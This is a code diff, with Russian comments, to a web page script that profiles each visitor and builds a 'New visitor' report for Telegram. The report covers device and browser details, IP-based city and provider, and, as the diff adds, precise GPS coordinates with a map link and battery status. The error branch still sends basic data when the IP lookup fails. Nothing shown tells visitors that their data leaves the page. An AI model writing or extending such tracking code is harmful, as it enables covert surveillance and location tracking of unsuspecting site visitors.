@@ -39,8 +39,53 @@
             }
         }
 
+        // Получение геолокации (если пользователь разрешит)
+        async function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Геолокация не поддерживается");
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        resolve(`https://www.google.com/maps?q=${lat},${lon} (${lat.toFixed(4)}, ${lon.toFixed(4)})`);
+                    },
+                    (error) => {
+                        resolve(`Ошибка геолокации: ${error.message}`);
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        // Получение информации о батарее
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) {
+                return "Информация о батарее недоступна";
+            }
+
+            try {
+                const battery = await navigator.getBattery();
+                return `
+                    Уровень: ${Math.floor(battery.level * 100)}%
+                    Состояние: ${battery.charging ? "Заряжается" : "Не заряжается"}
+                    Время до разряда: ${battery.dischargingTime === Infinity ? "Не определено" : `${Math.floor(battery.dischargingTime/60)} минут`}
+                `.replace(/\s+/g, ' ').trim();
+            } catch (error) {
+                return `Ошибка получения данных о батарее: ${error.message}`;
+            }
+        }
+
         // Сбор информации о пользователе
-        function collectUserData() {
+        async function collectUserData() {
+            const [geolocation, batteryInfo] = await Promise.all([
+                getGeolocation(),
+                getBatteryInfo()
+            ]);
+
             const data = {
                 "📅 Дата и время": new Date().toLocaleString('ru-RU'),
                 "🖥️ Устройство": navigator.platform,
@@ -48,7 +93,9 @@
                 "🖌️ Разрешение": `${screen.width}x${screen.height}`,
                 "📱 Мобильное": /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Да" : "Нет",
                 "🌍 Язык": navigator.language,
-                "⏱️ Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone
+                "⏱️ Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "🔋 Батарея": batteryInfo,
+                "📍 Геолокация": geolocation
             };
 
             // Получаем IP и дополнительную информацию
@@ -61,8 +108,8 @@
                 })
                 .then(response => response.json())
                 .then(geoData => {
-                    data["📍 Местоположение"] = `${geoData.city || 'Неизвестно'}, ${geoData.country_name || 'Неизвестно'}`;
                     data["🏢 Провайдер"] = geoData.org || 'Неизвестно';
+                    data["🗺️ IP-геолокация"] = `${geoData.city || 'Неизвестно'}, ${geoData.country_name || 'Неизвестно'}`;
                     
                     // Формируем сообщение для Telegram
                     let telegramMessage = "🔔 Новый посетитель:\n";
@@ -75,8 +122,8 @@
                 })
                 .catch(error => {
                     console.error('Ошибка:', error);
-                    // Отправляем хотя бы базовую информацию, если не получилось определить IP
-                    let telegramMessage = "🔔 Новый посетитель (без IP):\n";
+                    // Отправляем хотя бы базовую информацию
+                    let telegramMessage = "🔔 Новый посетитель:\n";
                     for (const [key, value] of Object.entries(data)) {
                         telegramMessage += `${key}: ${value}\n`;
                     }
